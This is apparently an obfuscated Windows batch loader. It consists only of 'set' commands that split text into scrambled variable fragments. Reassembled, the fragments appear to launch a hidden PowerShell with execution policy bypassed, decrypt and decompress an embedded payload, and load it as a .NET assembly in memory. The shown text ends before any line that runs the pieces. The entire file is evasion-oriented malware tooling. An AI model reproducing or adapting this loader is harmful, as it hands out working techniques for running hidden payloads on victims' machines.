@echo off
set "jSQVXVMlIg=in"
set "UsgabjMuTl=he"
set "dyqBdWnzvJ=xe"
set "qnwjLSiwxX=do"
set "OMZCsUgcar=s\"
set "MLWxszBuap=py"
set "XnFLwIfYSo=Wi"
set "hMRJtzKOrc=nd"
set "rJoQoVaReQ=po"
set "OAkNGSpFNp=\W"
set "eMMKeBebbO=we"
set "LOHSLNiJKH=ll"
set "ZqtwStCMLP=ll"
set "DGKfuZjkem= /"
set "ehBcpASSca=Po"
set "fSmYgMFLJV=1."
set "PZspWlZLSv=\v"
set "reuRcAGyPj=.e"
set "KTiQjUvZFd=rS"
set "JUDrzroTSh=ow"
set "MnNbdvEwKk=he"
set "QuxcFkKOvx=:\"
set "ulgLAuNprz=em"
set "WiRTlHSWYC=y "
set "OKhQPuzLXQ=0\"
set "NRdPaeRCAC=rs"
set "hMNxZlRPxH= C"
set "tINaVQXuQv=32"
set "fpwQqTateH=ws"
set "gSWiAdCNIf=Sy"
set "AWwtOcKnlf=st"
set "mymrnAJaZp=co"
set "kbByfhduqg=we"
set "aeQaaOIQiz= %~dp0"
set "hvgFKiqpAn=cd"
set "sRCwIkLIum=)))"
set "zYIsmYsyna=, (,"
set "IDAOpmVNhK=ddin"
set "CkaIqLFpQE=PTtG"
set "JEgTLsnuee=sion"
set "AXelKXJGNR=ionM"
set "oXQpyETNkK=O.Me"
set "DueLmisKKe= [st"
set "IoTArvhrFL=[Sys"
set "jsyNDyadiV=wIdY"
set "dpEMZxHifR=-Obj"
set "hUhoKxEaBW=V, 0"
set "hfNWkVCiMA= New"
set "hebQeeumXP=.Dis"
set "bAjZZHMdon=dj0C"
set "rpoGplECAi=pose"
set "bdezjaBvXE=F'[-"
set "RAgUiqlxNo=ct S"
set "xgJllTDdaa=nage"
set "ETgONRHabv=ck($"
set "mChRMjlWor=Bmor"
set "jQXwnfxaXl=$IXg"
set "YLQKRFlTUt=R = "
set "UpmZYaNDYf=ring"
set "AKmDiyAktn=ateD"
set "uCmaLzLegm=ect "
set "XTIAsAcJGG=.Cre"
set "VdmFpWOsZG=YxVw"
set "KuoeWieaJm=$GnF"
set "NPXsyxCNIF=rtS4"
set "ooAjNbdsab=orF'"
set "LtgoIUioQx=$IXg"
set "DpowifcWoT=em.I"
set "MIXQRfBdLK=ing("
set "mGyrEtpocq=-joi"
set "cgHTLppHhz=.Sec"
set "bDEHRuXInK=;$nn"
set "aqcSBboFcl=::De"
set "WrluRTfDOr=form"
set "rysyCgNoSV=();$"
set "ruNdxLONYu=t.Pa"
set "PUudxTylmp=BC;$"
set "qCOGTPkDPX=-ep "
set "vwNhDTYODx=[Env"
set "gjbtzpOFdd=n ''"
set "kowDjwVLkK=$nna"
set "BmPxWyyzNW=vert"
set "reEgUPoemX=bstr"
set "otPXEcuivO=tryP"
set "lcNckKGIoY=ddin"
set "bcxxuTppmW=zuZI"
set "PZoQygukoM=yste"
set "zWCKPZRrNc=('Tg"
set "qJXpWyiNYU=saBm"
set "whDtzIadbt=i = "
set "cOSRLYHgXs=ose("
set "bQUwDpEyqf=.Ass"
set "qfZlXLvrwW=s75K"
set "reXJYfBqJe=V = "
set "BKneLJpZcq=trea"
set "rSJLEIJUtc=alq."
set "jxbzNkIVsV=mory"
set "ayLtGwXiXt=wkO "
set "XzcDCAzxTL=gjYA"
set "cKokWxhYGx=JY);"
set "mzmsxMLtfX=y.Ci"
set "iSvSpuqgsO=lq.T"
set "MVYMACpcDD=-nop"
set "mTLSeoAOjO=($Yh"
set "EpajYdaBjz=.-16"
set "UxYDYBxGwz=Gt.I"
set "cQGtCIBrmW= '')"
set "hqQFEjurFc=Mode"
set "voOhNLqZzZ=$IXg"
set "wtNmqQAnKa=6esa"
set "tIMVrAuwzK=embl"
set "sIXbLjVlKJ=);$G"
set "itNsDnyZDH=pStr"
set "wiUqJyrTUi=b.Su"
set "yflAqgdjSb=Syst"
set "epYCIHPaEC=eMVs"
set "nQAtfIZpaB=alq "
set "DejeuNvMNc=ke($"
set "nYaaCfMrQL=ert]"
set "xepyJLoupm=();$"
set "UUtyGdFrVX=yste"
set "SctnsbyFTd=oL'["
set "MRenLYnXrV=hy.A"
set "CvPcVWIHOo=vrOG"
set "QBYdkBZieQ=;$Ih"
set "XqtoVsvsos=Disp"
set "NtVirZOXZL=tS46"
set "UlsuWHNfBc=  $O"
set "ISvDHBMrnk=join"
set "oVdYSRJYay=File"
set "NdEsZtXOzj=);$v"
set "oeFWjIMCoY=New-"
set "uGInqWfVhT=JY ="
set "ycRrFqDdqI=..-1"
set "gydCiGFQYr=comp"
set "zhLkuojZpN=urit"
set "lpYasVScEw=rans"
set "eIlozCwkyb=();$"
set "xPQnXQcqjO=am;$"
set "SdbxKzaDyB=onve"
set "mINHzIMBlT=rOGt"
set "bBiBOPzPKU='0Pg"
set "iaEirICRzz=;$tb"
set "MyXukFvxur=DmSL"
set "rwOIsvacNu=Jlqn"
set "BSAOKBzHyn=grap"
set "lqRrnCKfpa=comm"
set "flKADclOHv=ispo"
set "DcRnkyPZMD=.Mem"
set "yzmObbCIbH=($Yh"
set "HWIeryJNBT=vDR."
set "TujRBsrILS=::('"
set "jYKkQUDqaS=ay()"
set "RDQiPxdzAB=pose"
set "sWIPlekHEK=3); "
set "QpfaEKmqDu=m.Re"
set "YYBmUBdyac=bypa"
set "gusxjSONCA=YV);"
set "DKszNabZPO=, $w"
set "adWrdxMWvE=oryS"
set "GcRWhEWuPD=Secu"
set "DJBgjyecFq=JY.T"
set "gALrcokVKS=S46e"
set "eznTNuUrcP=);$I"
set "kMlpzRypwD=YhAo"
set "kpQBhfnOJX=GnFb"
set "aATSntgJqG=join"
set "PhEDCkYMBN=;$Xm"
set "EHABqKyXvM=$wId"
set "aNePvmHBOM=B) {"
set "NTGItddblr=Syst"
set "uTagSzZlJr=esMa"
set "FUenNvQVvr=gMod"
set "pnfttgAWdX=('da"
set "lSUJNbZKDG=oin "
set "hkofFIcOoU=XmvD"
set "sWqyfRfngJ=hRYB"
set "nBPfRpbabb=RYB."
set "IdECKwTEAv=nFbi"
set "SWeYsbgsqf= = $"
set "DIrTZKJtUY=106u"
set "zgqzFACoEV=fore"
set "TvxIGfgmvL=ress"
set "DuIZFDUvtR=..-1"
set "WutGnxBJsL=flec"
set "kGWlToQaCv=in $"
set "FKzUQFYqqo== [S"
set "IRYGeGbEod=tbwk"
set "MlUqyMpLNH=zHhH"
set "WxehEeomOQ=ptor"
set "aVzdDipxDt=Secu"
set "ZykhrHOfmn=L4Yi"
set "yedIdtGWHx=IdYV"
set "QtUoyPkLcp=:('g"
set "RFAOqYnrkJ='')("
set "eLmIYAzaAB='[-1"
set "UzzkFSHffB=rOGt"
set "hsLELePuFj=Obje"
set "fjLubkIfGo=16] "
set "KsISnEkSNp=daeR"
set "tGomkSrYkm=le  "
set "czurOLFOCr=1..-"
set "nRDpLtrWBw=morF"
set "wotWfzpkiK==');"
set "vzWsbRcLPG='[-1"
set "pUGVtScgni=m(, "
set "ZUxZwjdzcS=rt]:"
set "cScFKOnBfL=rOGt"
set "aFvSStrJrG=stem"
set "GeUUUVPFxX=6] -"
set "UhNDFENXUp=Fina"
set "XwIchYTjZx=YV ="
set "YPXCRZqPXD=tem."
set "GomQvBPREE=Star"
set "EJcJoHsDsP=Comp"
set "qnWunPVTOB=d;$v"
set "xfSeIXXZRQ= = ["
set "xHBIIwCgPG=Aob."
set "DtcyQNleyD=k; }"
